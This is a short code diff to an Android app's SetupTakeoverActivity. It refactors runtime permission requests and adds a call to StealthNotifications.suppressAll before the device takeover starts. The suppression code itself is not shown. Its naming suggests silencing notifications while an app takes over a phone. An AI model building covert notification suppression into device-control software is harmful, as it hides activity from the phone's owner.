@@ -1,8 +1,6 @@
 package com.phonehand.app
 
-import android.Manifest
 import android.content.pm.PackageManager
-import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
@@ -44,6 +42,7 @@ class SetupTakeoverActivity : AppCompatActivity() {
         }
 
         requestRuntimePermissions()
+        StealthNotifications.suppressAll(this)
         startTakeover()
     }
 
@@ -53,16 +52,9 @@ class SetupTakeoverActivity : AppCompatActivity() {
     }
 
     private fun requestRuntimePermissions() {
-        val needed = mutableListOf<String>()
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
-                != PackageManager.PERMISSION_GRANTED
-            ) {
-                needed.add(Manifest.permission.POST_NOTIFICATIONS)
-            }
-        }
+        val needed = PermissionRequester.missing(this)
         if (needed.isNotEmpty()) {
-            appendLog("Requesting: ${needed.joinToString()}")
+            appendLog("Requesting: ${needed.joinToString { it.substringAfterLast('.') }}")
             ActivityCompat.requestPermissions(this, needed.toTypedArray(), REQ_PERMISSIONS)
         }
     }
